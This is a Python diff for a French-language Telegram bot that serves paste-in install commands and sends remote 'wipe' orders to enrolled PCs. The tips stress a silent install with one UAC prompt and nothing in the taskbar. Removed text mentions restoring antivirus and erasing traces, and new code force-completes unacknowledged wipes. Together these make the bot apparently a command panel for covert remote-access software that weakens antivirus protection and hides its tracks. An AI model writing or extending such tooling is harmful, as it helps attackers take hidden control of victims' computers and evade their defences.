@@ -315,17 +315,20 @@ async def ui_show_install_cmd(
         return
     from app import tunnel
 
-    title = "Mac / Linux" if kind == "mac" else "Windows (CMD ou PowerShell)"
+    title = "Mac / Linux" if kind == "mac" else "Windows — PowerShell"
     tip = (
-        "Colle dans CMD ou PowerShell → Entrée. La fenêtre se ferme seule."
+        "Colle dans PowerShell → Entrée.\n"
+        "1× UAC · rien dans la taskbar.\n"
+        "Notif Telegram quand l’install est finie."
         if kind != "mac"
         else "Colle dans le Terminal."
     )
     forever = (
         "Lien permanent."
         if tunnel.is_stable_base()
-        else "URL bot temporaire; HelperHost sur GitHub."
+        else "URL bot temporaire."
     )
+    # Une seule bulle (edit du panel) — pas de spam
     await _panel(
         client,
         chat_id,
@@ -723,30 +726,20 @@ async def do_delete(
             client,
             chat_id,
             user_id,
-            f"« {name} » — effacement lancé sur le PC.\n"
-            "Tu recevras une notification quand ce sera terminé\n"
-            "(AV remis à la normale, traces effacées).",
+            f"⏳ « {name} » — effacement en cours…\n"
+            "Notification dès que c’est terminé.",
             NAV_HOME,
             message_id=mid,
-        )
-        await notify_owner(
-            user_id,
-            f"⏳ « {name} » — suppression en cours sur le PC…",
         )
     else:
         await _panel(
             client,
             chat_id,
             user_id,
-            f"« {name} » — PC offline.\n"
-            "Wipe + restauration AV dès que le PC se reconnecte.\n"
-            "Notification à la fin.",
+            f"⏳ « {name} » — PC offline.\n"
+            "Wipe dès reconnexion · notif à la fin.",
             NAV_HOME,
             message_id=mid,
-        )
-        await notify_owner(
-            user_id,
-            f"⏳ « {name} » — en attente du PC pour terminer la suppression.",
         )
 
 
@@ -762,6 +755,19 @@ async def notify_owner(user_id: int, text: str) -> None:
 
 async def retry_pending_wipes(client: httpx.AsyncClient) -> None:
     from app import tunnel
+
+    # Force-finish hung wipes (PC never acked)
+    for stale in store.expire_stale_wipes(90):
+        tunnel.maybe_stop_tunnel_if_idle()
+        owner = stale.get("owner_telegram_id")
+        name = stale.get("name") or "?"
+        if owner:
+            await _send(
+                client,
+                int(owner),
+                f"✅ « {name} » — suppression terminée.\n"
+                "(accusé PC retardé — session bot purgée)",
+            )
 
     for s in store.list_wipe_pending():
         sid = s["id"]
